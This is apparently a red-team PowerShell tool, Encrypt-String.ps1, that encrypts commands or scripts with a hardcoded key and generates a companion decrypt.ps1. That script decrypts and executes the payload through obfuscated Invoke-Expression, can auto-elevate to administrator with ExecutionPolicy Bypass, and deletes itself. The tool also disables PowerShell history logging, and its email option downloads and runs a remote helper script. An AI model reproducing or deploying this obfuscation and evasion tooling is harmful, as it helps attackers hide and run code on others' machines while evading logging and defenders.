<#
.SYNOPSIS
   Encrypt\auto-decrypt strings with an 113 bytes secret key.
    
   Author: r00t-3xp10it
   Tested Under: Windows 10 (19042) x64 bits
   Required Dependencies: ConvertTo-SecureString {native}
   Optional Dependencies: Decrypt-String.ps1, ReadEmails.ps1
   PS cmdlet Dev version: v1.2.18
   
.DESCRIPTION
   This cmdlet allow users to encrypt text\commands\scripts.ps1 with the help
   of ConvertTo-SecureString cmdlet and a secretkey of 113 bytes length, it
   outputs results on console,logfile or builds a decrypt.ps1 script with the
   decrypt function routine to be abble to execute the encrypted string ..

.NOTES
   If invoked -RandomByte '0' then cmdlet random generates SecretKey last byte.
   But in that ocassion the Decrypt-String.ps1 cmdlet will not work unless the
   comrrespondent secretkey ( the same secretkey used to encrypt ) its invoked.
   Remark: Parameter -RandomByte '253' (secretkey last byte) can be invoked on
   Decrypt-String cmdlet to input the required secretKey used by Encrypt-String
   
.Parameter Action
   Accepts arguments: console, autodecrypt, log (default: console)

.Parameter PlainTextString
   The string\text\command to encrypt (default: whoami)

.Parameter InFile
   Get the string to encrypt from txt\ps1 (default: false)

.Parameter OutFile
   The decrypt routine script name (default: decrypt)

.Parameter RandomByte
   Accepts: 0 (random), 253 (default) OR from 240 to 255

.Parameter Deldecrypt
   Auto-delete decrypt.ps1 cmdlet? (default: true)

.Parameter RunElevated
   Auto-elevate decrypt.ps1 cmdlet? (default: false)

.Parameter SendTo
   Send encrypted string to email (default: false)

.Parameter ClipBoard
   Copy encrypted string to clipboard? (default: false)

.EXAMPLE
   PS C:\> Get-Help .\Encrypt-String.ps1 -full
   Access this cmdlet comment based help!

.EXAMPLE
   PS C:\> .\Encrypt-String.ps1 -action "console" -plaintextstring "whoami"
   Encrypt -plaintextstring 'whoami' command and print results onscreen

.EXAMPLE
   PS C:\> .\Encrypt-String.ps1 -action "log" -plaintextstring "whoami"
   Encrypt -plaintextstring 'whoami' command and store results on logfile

.EXAMPLE
   PS C:\> .\Encrypt-String.ps1 -action "console" -infile "test.ps1"
   Encrypt the contents of 'test.ps1' and print results onscreen

.EXAMPLE
   PS C:\> .\Encrypt-String.ps1 -action "autodecrypt" -plaintextstring "whoami"
   Encrypt 'whoami' command and build auto-decrypt routine function script.ps1

.EXAMPLE
   PS C:\> .\Encrypt-String.ps1 -action "autodecrypt" -infile "test.ps1" -randombyte "248"
   Encrypt the contents of 'test.ps1' (last byte 248) + build auto-decrypt routine decrypt.ps1

.EXAMPLE
   PS C:\> .\Encrypt-String.ps1 -action "autodecrypt" -plaintextstring "powershell.exe" -runelevated "true"
   Encrypt 'powershell.exe' command + build auto-decrypt routine decrypt.ps1 that runs elevated (administrator)

.EXAMPLE
   PS C:\> .\Encrypt-String.ps1 -action "console" -plaintextstring "whoami" -SendTo "pedroubuntu101@gmail.com"
   Encrypt 'whoami' command + send encrypted string to the recipient email address

.INPUTS
   None. You cannot pipe objects into Encrypt-String.ps1

.OUTPUTS
   * Powershell 113[bytes] chiper cmdlet.

   OriginalStringChars  : 42
   SecretKeyByteLength  : 113
   ConvertedStringChars : 616
   PlainTextString      : netstat -ano|findstr ':443'|findstr /V '['
   EncryptedString      : 76492d1116743f0423413b16050a5345MgB8AHEASgBpAGoAZABlAFEATwBLAHIAbABIAHEAUwBEAG4AKwB5AG8AOQBUAEEAPQA9AHwAOAA0ADgANgBmAGYANAAzAD
                          MANgBlAGIAMAA4ADEANQBjADEANgA1ADAAYwA0AGYANAA2ADUAMgAzAGIANwAxADAANAA5ADgAMABiAGUAMABiADMAMgA3AGMAMgAzADQANQA5ADAAZgBjAGUANQA2
                          ADMAMgBmAGYAMAA4ADAANgBkADkAYwA1ADQANwA2ADAAZQA5ADEAOQAxADYAOAAyADYANgA2ADAAYwA3AGUAMQBkADAAMABjADUAMwBiADUAOAAzADEAMQBlAGQAMg
                          AxADgAYgBjADEAMQA3ADUAZgBiAGIANgAxAGEAZQA3ADAANQAwADgAMAA5ADYAZQAwAGIAYQA4AGYAZABhADkANgA2AGIAYQAxADcANQBmAGIAMAAyADYAMwBiADkA
                          MgA0ADIAOQA1ADAAMQA2AGIAOQA0ADkAOQAzAGQAMwA3ADEAZABhADgAOABmADcAZAA3ADcAMwA2AGMAMwAwADQAZgA2ADUAZABkADUAMgAwAGEA
   
.LINK
   https://github.com/r00t-3xp10it/redpill/tree/main/bypass/encrypt_decrypt/Encrypt-String.ps1
   https://github.com/r00t-3xp10it/redpill/tree/main/bypass/encrypt_decrypt/Decrypt-String.ps1
#>


#CmdLet Global variable declarations!
[CmdletBinding(PositionalBinding=$false)] param(
   [string]$PlainTextString="whoami",
   [string]$RunElevated="false",
   [string]$Deldecrypt="true",
   [string]$OutFile="decrypt",
   [string]$ClipBoard="false",
   [string]$Action="console",
   [string]$SendTo="false",
   [string]$InFile="false",
   [byte]$RandomByte='253',
   [string]$Egg="false"
)


$cmdletVersion = "v1.2.18"
$ErrorActionPreference = "SilentlyContinue"
#Disable Powershell Command Logging for current session.
Set-PSReadlineOption –HistorySaveStyle SaveNothing|Out-Null
$host.UI.RawUI.WindowTitle = "@Encrypt-String $cmdletVersion {SSA@RedTeam}"
If($Egg -ieq "false")
{
   write-host "`n* Powershell 113[bytes] chiper cmdlet." -ForegroundColor Green
}

If($Action -iNotMatch '^(console|autodecrypt|log|logfile)$')
{
   write-host "*" -ForegroundColor Red -BackgroundColor Black -NoNewline;
   write-host " Error: " -ForegroundColor DarkGray -BackgroundColor Black -NoNewline;
   write-host "wrong parameter argument input .." -ForegroundColor Red -BackgroundColor Black;
   Start-Sleep -Seconds 2;Get-Help .\Encrypt-String.ps1 -Detailed;exit
}
If(Test-Path -Path "$pwd\EncryptedString.log" -EA SilentlyContinue)
{
   Remove-Item -Path "$pwd\EncryptedString.log" -Force
}


If($InFile -ne "false")
{

   <#
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - Get string to encrypt from script[.ps1|.txt]
   #>

   #Check for cmdlet dependencies!
   If(-not(Test-Path -Path "$InFile" -EA SilentlyContinue))
   {
      Write-Host "* error: not found: '$InFile'" -ForegroundColor Red -BackgroundColor Black
      Write-Host "";exit #Exit @Encrypt-String   
   }
   If($InFile -iNotMatch '(.ps1|.psm1|.psd1|.txt)$')
   {
      Write-Host "* error: accepted formats: '.ps1|.psm1|.psd1|.txt'" -ForegroundColor Red -BackgroundColor Black
      Write-Host "";exit #Exit @Encrypt-String 
   }

   #Get the cmdline\string to encrypt from script[.ps1|.txt]
   [string]$PlainTextString = [System.IO.File]::ReadAllText("$InFile")

}


[byte]$DiceMe = 9 #Secret key 2º byte
## Encryption key (secret key 113 bytes)
# DESCRIPTION: last byte key randomize function.
If($RandomByte -lt 240 -or $RandomByte -gt 255)
{
   #Randomize secret key last byte [253]
   [byte]$RoolTheDiceAgain = Get-Random -Minimum 240 -Maximum 255
   #[byte]$DiceMe = Get-Random -Minimum 7 -Maximum 17 #Randomize secret key 2º byte [9]
}
Else
{
   #User_Input OR Default setting!
   [byte]$RoolTheDiceAgain = [byte]$RandomByte
}
## Encryption key (secret key 113 bytes)
# NOTE: We can change the follow bytes for a diferent secret key TokenId.
#       But that require us to manual change all of the instances of the
#       secret key inside of 'Encrypt-String' + 'Decrypt-String' cmdlets.
# BYTE:                  |             |         |            |                                                |
# BYTE:                  9             22        82           83                                               50
[Byte[]]$SecretKey = 117,$DiceMe,103,192,133,20,53,149,83,95,108,34,82,224,226,220,56,68,133,120,139,238,176,239,171,54,231,205,83,57,51,$RoolTheDiceAgain
$DisplaySecret = "117,$DiceMe,103,192,133,20,53,149,83,95,108,34,82,224,226,220,56,68,133,120,139,238,176,239,171,54,231,205,83,57,51,$RoolTheDiceAgain"
$CountBytes = [System.Text.Encoding]::UTF8.GetByteCount($SecretKey)

Try{## ConvertTo-SecureString
   $secureString = Convertto-SecureString $PlainTextString -AsPlainText -Force
   $EncryptedString = ConvertFrom-SecureString -SecureString $secureString -Key $SecretKey
}
Catch{Throw $_}


#Count how man chars does the 'original string' have!
$Countlines = ($PlainTextString|measure -character).Characters.ToString()

#Count how many chars exist in encryption string!
$Chars = ($EncryptedString|measure -character).Characters.ToString()


If($Action -ieq "console")
{

   <#
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - Print Encrypted string OnScreen.
   #>

   If($EncryptedString.Length -gt 1000)
   {
      #Write logfile to the sellected directory!
      If($ClipBoard -ieq "True"){echo "$EncryptedString"|Clip}
      echo "$EncryptedString"|Out-File "$pwd\EncryptedString.log" -encoding ascii -force

      If($Egg -ieq "False")
      {
         If($ClipBoard -ieq "True")
         {
            write-host "*" -ForegroundColor Green -NoNewline;
            write-host " Encrypted string copy to '" -ForegroundColor DarkGray -NoNewline;
            write-host "clipboard" -ForegroundColor DarkYellow -NoNewline;
            write-host "'[" -ForegroundColor DarkGray -NoNewline;
            write-host "OK" -ForegroundColor Green -NoNewline;
            write-host "]" -ForegroundColor DarkGray;
         }
         write-host "*" -ForegroundColor Green -NoNewline;
         Write-Host " EncryptedString written to: '" -ForegroundColor DarkGray -NoNewline;
         Write-Host "$pwd\EncryptedString.log" -ForegroundColor Green -NoNewline;
         Write-Host "'" -ForegroundColor DarkGray;         
      }
   }
}


If($Action -iMatch "^(log|Logfile)$")
{

   <#
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - store results in logfile.
   #>

   #Write logfile to the sellected directory!
   If($ClipBoard -ieq "True"){echo "$EncryptedString"|Clip}
   echo "$EncryptedString"|Out-File "$pwd\EncryptedString.log" -encoding ascii -force

   If($Egg -ieq "False")
   {
      If($ClipBoard -ieq "True")
      {
         write-host "*" -ForegroundColor Green -NoNewline;
         write-host " Encrypted string copy to '" -ForegroundColor DarkGray -NoNewline;
         write-host "clipboard" -ForegroundColor DarkYellow -NoNewline;
         write-host "'[" -ForegroundColor DarkGray -NoNewline;
         write-host "OK" -ForegroundColor Green -NoNewline;
         write-host "]" -ForegroundColor DarkGray;
      }
      write-host "*" -ForegroundColor Green -NoNewline;
      Write-Host " EncryptedString written to: '" -ForegroundColor DarkGray -NoNewline;
      Write-Host "$pwd\EncryptedString.log" -ForegroundColor Green -NoNewline;
      Write-Host "'" -ForegroundColor DarkGray;         
   }

}


If($Action -ieq "autodecrypt")
{

   <#
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - Build decrypt routine decrypt.ps1
   #>


If($Deldecrypt -ieq "True")
{
   #Auto-Delete decrypt.ps1 cmdlet in the end of execution ..
   $AutoDeleteCmdlet = "Remove-Item -LiteralPath `$MyInvocation.MyCommand.Path -Force"
}

#Elevate decrypt.ps1 privs?
$RunAsAdmin = @("If(-not([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] `"Administrator`")){
   Start-Process powershell.exe `"-NoProfile -ExecutionPolicy Bypass -File ```"`$PSCommandPath```"`" -Verb RunAs
   exit
}")


#Decrypt function script!
$PS1DecriptRot = @("<#
.SYNOPSIS
   Author: @r00t-3xp10it
   Helper - Decrypt\Execute 113[bytes] cipher! 
#>

[Byte[]]`$SecretKey = 117,$DiceMe,103,192,133,20,53,149,83,95,108,34,82,224,226,220,56,68,133,120,139,238,176,239,171,54,231,205,83,57,51,$RoolTheDiceAgain
[String]`$EncryptedString = `"$EncryptedString`"

Try{
   `$SecureString = ConvertTo-SecureString `$EncryptedString -Key `$SecretKey
   `$bstr = [Runtime.InteropServices.Marshal]::SecureStringToBSTR(`$SecureString)
   [string]`$String = [Runtime.InteropServices.Marshal]::PtrToStringAuto(`$bstr)
   [Runtime.InteropServices.Marshal]::ZeroFreeBSTR(`$bstr)

   #Execute Decrypted string
   echo `"`$String`"|&((echo `"0i0E0x`") -replace '0','')
}
Catch{Throw `$_}
$AutoDeleteCmdlet
")


$OutFile = "$OutFile"+".ps1" -join ''
#Write logfile to the sellected directory!
echo "$PS1DecriptRot"|Out-File "$pwd\$OutFile" -encoding ascii -force


   If($RunElevated -ieq "True")
   {
      #Append 'auto-elevation' function to decrypt.ps1 cmdlet..
      ((Get-Content -Path "$pwd\$OutFile" -Raw) -Replace "#>","#>`n`n$RunAsAdmin")|Set-Content -Path "$pwd\$OutFile" -Force
   }

   If($Egg -ieq "False")
   {
      If($EncryptedString.Length -gt 1000)
      {
         If($ClipBoard -ieq "True")
         {
            echo "$EncryptedString"|Clip
            write-host "*" -ForegroundColor Green -NoNewline;
            write-host " Encrypted string copy to '" -ForegroundColor DarkGray -NoNewline;
            write-host "clipboard" -ForegroundColor DarkYellow -NoNewline;
            write-host "'[" -ForegroundColor DarkGray -NoNewline;
            write-host "OK" -ForegroundColor Green -NoNewline;
            write-host "]" -ForegroundColor DarkGray;
         }

         write-host "*" -ForegroundColor Green -NoNewline;
         Write-Host " Decrypt routine written to: '" -ForegroundColor DarkGray -NoNewline;
         Write-Host "$pwd\$OutFile" -ForegroundColor Green -NoNewline;
         Write-Host "'" -ForegroundColor DarkGray;

         #Write logfile to the sellected directory!
         echo "$EncryptedString"|Out-File "$pwd\EncryptedString.log" -encoding ascii -force

         write-host "*" -ForegroundColor Green -NoNewline;
         Write-Host " EncryptedString written to: '" -ForegroundColor DarkGray -NoNewline;
         Write-Host "$pwd\EncryptedString.log" -ForegroundColor Green -NoNewline;
         Write-Host "'" -ForegroundColor DarkGray;
      }
   } 

}


If($Egg -ieq "false")
{

   <#
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - Print Output OnScreen.
   #>

   write-host ""
   write-host "OriginalStringChars  : $Countlines" -ForegroundColor white
   write-host "SecretKeyByteLength  : $CountBytes" -ForegroundColor white
   write-host "ConvertedStringChars : $Chars" -ForegroundColor white
   write-host "PlainTextString      : " -ForegroundColor white -NoNewline;
   write-host "$PlainTextString" -ForegroundColor DarkYellow;

   If($RandomByte -ne 253)
   {
      ## Print SecretKey if invoked -RandomByte '0' parameter and
      # colorize the last byte of secretkey to be used in Decrypt-String
      [string]$ParseLastByte = $DisplaySecret.Split(',')[-1]                # Get last byte of secretkey
      [string]$ParseFirsByte = $DisplaySecret -replace "$ParseLastByte",""  # Delete last byte of secretKey
      write-host "RawSecretKey         : $ParseFirsByte" -ForegroundColor Green -NoNewline;
      write-host "$ParseLastByte" -ForegroundColor Yellow;
   }

   write-host "EncryptedString      : " -ForegroundColor white -NoNewline;
   write-host "$EncryptedString" -ForegroundColor DarkGray   
}


write-host ""
If($SendTo -ne "false")
{

   <#
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - Use outlook to send encrypted strings

   .NOTES
      This function allow users to auto-send encrypted
      strings to the inputed email address recipient.

   .EXAMPLE
      PS C:\> .\Encrypt-String.ps1 -action "console" -plaintextstring "whoami" -SendTo "pedroubuntu101@gmail.com"
   #>

   $SendBody = "$EncryptedString";
   $SendSubject = "@Encrypt-String email chat"
   iwr -Uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/ReadEmails.ps1" -OutFile "$Env:TMP\ReadEmails.ps1"|Unblock-File;
   powershell -File $Env:TMP\ReadEmails.ps1 -action 'send' -SendTo "$SendTo" -SendSubject "$SendSubject" -SendBody "$SendBody";
   Remove-Item -Path $Env:TMP\ReadEmails.ps1 -Force
}